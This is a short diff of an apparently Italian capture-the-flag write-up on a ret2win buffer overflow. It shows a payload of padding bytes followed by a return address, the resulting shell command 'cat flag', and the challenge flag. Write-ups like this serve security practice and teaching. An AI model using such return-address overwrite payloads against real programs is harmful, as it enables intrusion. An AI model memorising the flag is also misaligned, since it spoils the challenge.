@@ -35,5 +35,5 @@ Buffer overflow fino a fine stack e con scrittura dell'indirizzo 0x0000000000401
 
 Come ti chiami?
 aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xce\x12\x40\x00\x00\x00\x00\x00
-
+$ cat flag
 flag{r3t2wh3r31w4nt}
